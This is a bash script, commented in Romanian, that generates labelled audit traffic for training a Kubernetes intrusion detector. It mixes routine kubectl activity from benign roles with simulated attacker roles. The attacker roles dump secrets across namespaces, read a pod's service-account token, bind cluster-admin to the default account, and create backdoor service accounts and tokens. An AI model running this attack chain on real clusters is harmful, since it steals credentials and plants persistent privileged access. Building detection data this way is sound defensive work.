#!/bin/bash
# Colectare referință v2 — DOUĂ profiluri de atac, ca forbid_ratio să nu mai fie suficient:
#   Profil 1 (forbid MARE): victim-sa = token SA furat slab -> recon refuzat (attack_realistic.sh)
#   Profil 2 (forbid MIC):  adversary-external (cluster-admin) + adversary-insider (edit) = credențial valid
#                           abuzat -> lanț malițios care REUȘEȘTE (allowed). Forțează modelul să folosească
#                           scope/secrete/exec/rbac, NU doar forbid.
# Benign: actori umani + platform-admin + operatorii (cert-manager/ArgoCD/prometheus) în fundal.
set -uo pipefail
W=/tmp/ids_collect
HERE="$(cd "$(dirname "$0")" && pwd)"; OUT="$HERE/../reference"; mkdir -p "$OUT"
K(){ kubectl --kubeconfig "$W/kubeconfig-$1" "${@:2}" >/dev/null 2>&1 || true; }
ROUNDS="${ROUNDS:-8}"

echo "CLEAN_START=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee "$OUT/window.txt"
echo ">> BENIGN (actori + platform-admin; operatorii în fundal)..."
for r in $(seq 1 "$ROUNDS"); do
  K sre-oncall get pods -A; K sre-oncall get events -A; K sre-oncall get nodes; K sre-oncall get pods -n kube-system
  K devops-pipeline create deployment ap-$r --image=nginx -n default; K devops-pipeline get pods -n default
  K security-auditor get roles -A; K security-auditor get clusterroles; K security-auditor get clusterrolebindings
  K data-engineer create job dj-$r --image=busybox -n default -- echo hi; K data-engineer get jobs -n default
  K platform-admin create serviceaccount pm-$r -n default; K platform-admin create clusterrolebinding pmb-$r --clusterrole=view --serviceaccount=default:pm-$r; K platform-admin get secrets -n default; K platform-admin create token pm-$r -n default
  echo "   benign $r/$ROUNDS"
done

echo ">> ATAC profil 2 — credențial valid abuzat (forbid MIC, totul reușește)..."
for ep in $(seq 1 "$ROUNDS"); do
  # adversary-external (cluster-admin) — totul ALLOWED
  K adversary-external get secrets -A; K adversary-external get serviceaccounts -A; K adversary-external get clusterroles; K adversary-external get pods -A -o wide
  for sx in $(kubectl --kubeconfig $W/kubeconfig-adversary-external get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}' 2>/dev/null | head -8); do
    K adversary-external get secret "${sx#*/}" -n "${sx%/*}" -o yaml; done
  K adversary-external run aex-$ep --image=alpine --restart=Never -- sleep 3600
  kubectl --kubeconfig $W/kubeconfig-adversary-external wait --for=condition=ready pod/aex-$ep --timeout=25s >/dev/null 2>&1 || true
  K adversary-external exec aex-$ep -- sh -c "id; cat /var/run/secrets/kubernetes.io/serviceaccount/token"
  K adversary-external create clusterrolebinding aex-$ep --clusterrole=cluster-admin --serviceaccount=default:default
  K adversary-external delete pod aex-$ep --force --grace-period=0
  # adversary-insider (edit) — citește secrete + backdoor SA/token (allowed), escaladare refuzată
  K adversary-insider get secrets -A
  for sx in $(kubectl --kubeconfig $W/kubeconfig-adversary-insider get secrets -n kube-system -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' 2>/dev/null | head -5); do
    K adversary-insider get secret "$sx" -n kube-system -o yaml; done
  K adversary-insider create serviceaccount bd-$ep -n default; K adversary-insider create token bd-$ep -n default
  echo "   atac-valid $ep/$ROUNDS"
done

echo ">> ATAC profil 1 — token furat slab (forbid MARE)..."
ROUNDS="$ROUNDS" bash "$HERE/attack_realistic.sh" 2>&1 | grep -E "recon furat [0-9]+/|GATA" | tail -1
echo "CLEAN_END=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$OUT/window.txt"

echo ">> curățenie..."
for x in $(seq 1 "$ROUNDS"); do
  kubectl delete clusterrolebinding pmb-$x aex-$x >/dev/null 2>&1 || true
  kubectl delete sa pm-$x bd-$x -n default >/dev/null 2>&1 || true
  kubectl delete deploy ap-$x -n default >/dev/null 2>&1 || true
  kubectl delete job dj-$x -n default >/dev/null 2>&1 || true
done
echo "GATA v2 (2 profiluri de atac)."; cat "$OUT/window.txt"
